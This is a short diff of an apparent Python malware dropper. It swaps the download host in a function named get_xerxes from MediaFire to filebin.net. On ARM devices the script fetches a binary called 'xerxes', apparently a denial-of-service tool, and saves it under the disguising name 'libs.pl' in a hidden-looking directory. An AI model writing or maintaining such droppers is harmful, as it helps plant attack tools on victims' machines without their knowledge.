@@ -19,7 +19,7 @@ myname = ".demp.ov"
 
 
 def get_xerxes():
-  armv = "https://download1081.mediafire.com/2y7o2pi3uvxg/7dk6gqajwq6931o/xerxes"
+  armv = "https://filebin.net/je7wvxor3p36qdj4/xerxes?t=14jz8xxf"
 
   if "armv" in platform.machine():
     urllib.urlretrieve(armv,"{}/libs.pl".format(mypwd))
